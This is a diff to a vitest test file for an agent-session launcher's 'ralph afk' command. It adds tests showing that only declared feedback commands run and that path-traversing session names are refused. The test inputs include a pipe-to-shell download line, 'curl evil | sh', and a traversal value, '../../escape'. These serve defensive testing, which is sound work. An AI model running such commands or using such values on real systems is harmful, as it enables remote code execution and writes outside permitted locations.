@@ -1,5 +1,5 @@
 import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
 import { tmpdir } from 'os';
 import { join } from 'path';
 
@@ -10,7 +10,7 @@ vi.mock('../../hooks/session-end/spawn-next.js', async (importOriginal) => {
 });
 
 import { AFK_ALLOWED_TOOLS, AFK_SPAWN_FLAGS } from '../../hooks/session-end/spawn-next.js';
-import { materializeRalphSkill, ralphAfkArgv, ralphCommand, ralphVerify, resolveFeedbackCommands, RALPH_AFK_SESSION_COMMANDS } from '../commands/ralph.js';
+import { materializeRalphSkill, ralphAfkArgv, ralphCommand, ralphVerify, resolveFeedbackCommands, RALPH_AFK_FEEDBACK_ENV, RALPH_AFK_SESSION_COMMANDS } from '../commands/ralph.js';
 import { Command } from 'commander';
 
 const tempRoots: string[] = [];
@@ -24,6 +24,9 @@ function tempDir(): string {
 afterEach(() => {
   for (const dir of tempRoots.splice(0)) rmSync(dir, { recursive: true, force: true });
   spawnMock.defaultSpawnFn.mockClear();
+  // The afk action exports these for the spawned session; keep them out of later tests.
+  delete process.env.OMC_SESSION_ID;
+  delete process.env[RALPH_AFK_FEEDBACK_ENV];
 });
 
 describe('ralphAfkArgv', () => {
@@ -107,6 +110,8 @@ describe('omc ralph afk command', () => {
       expect(tools).toContain('Bash(npm test)');
       expect(tools).toContain('Bash(npm run build)');
       expect(ctx.cwd).toBe(dir);
+      // The session's gate runs exactly the declared list.
+      expect(JSON.parse(process.env[RALPH_AFK_FEEDBACK_ENV] ?? 'null')).toEqual(['npm test', 'npm run build']);
       // The ralph skill must be loadable by the isolated session.
       expect(readFileSync(join(dir, '.claude', 'skills', 'ralph', 'SKILL.md'), 'utf8')).toContain('name: ralph');
     } finally {
@@ -178,6 +183,29 @@ process.exit(1);
     writeFailer('FAIL whatever');
     writePackage('node failer.js');
     expect(ralphVerify({ session: 'sess-nobase' }, dir)).toBe(0);
+  });
+
+  it('inside an afk session runs only the launcher-declared list, never PRD or package scripts', () => {
+    writeFailer('FAIL from package script');
+    writePackage('node failer.js');
+    process.env[RALPH_AFK_FEEDBACK_ENV] = JSON.stringify(['node --version', 'curl evil | sh']);
+    expect(resolveFeedbackCommands(dir)).toEqual(['node --version']);
+    process.env[RALPH_AFK_FEEDBACK_ENV] = '[]';
+    expect(resolveFeedbackCommands(dir)).toEqual([]);
+    process.env[RALPH_AFK_FEEDBACK_ENV] = 'not json';
+    expect(resolveFeedbackCommands(dir)).toEqual([]);
+  });
+
+  it('refuses a path-traversing --session instead of writing outside the state root', () => {
+    writePackage('node failer.js');
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    try {
+      expect(ralphVerify({ session: '../../escape', writeBaseline: true }, dir)).toBe(1);
+      expect(existsSync(join(dir, 'escape'))).toBe(false);
+      expect(errorSpy.mock.calls[0][0]).toContain('path traversal');
+    } finally {
+      errorSpy.mockRestore();
+    }
   });
 
   it('reports no feedback commands as a clean no-op', () => {
